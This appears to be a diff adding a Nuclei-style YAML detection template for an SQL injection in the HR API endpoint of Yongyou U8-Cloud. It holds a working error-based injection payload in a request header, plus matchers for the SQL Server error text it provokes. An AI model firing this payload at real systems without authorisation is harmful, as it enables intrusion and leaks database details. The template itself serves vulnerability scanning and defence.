@@ -1,0 +1,30 @@
+id: poc-yaml-yongyou-u8cloud-api-hr-sqli
+info:
+  name: Yongyou U8-Cloud API-HR SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detects SQL injection vulnerability in the Yongyou U8-Cloud API-HR endpoint.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/u8cloud/api/hr"
+    headers:
+      system: "-1' or 1=@@version--+"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "U8C返回信息:在将 nvarchar 值"
+          - "Microsoft SQL Server"
+          - "转换成数据类型 int 时失败"
+        part: body
+      - type: word
+        words:
+          - "application/json"
+        part: header
+        name: content-type
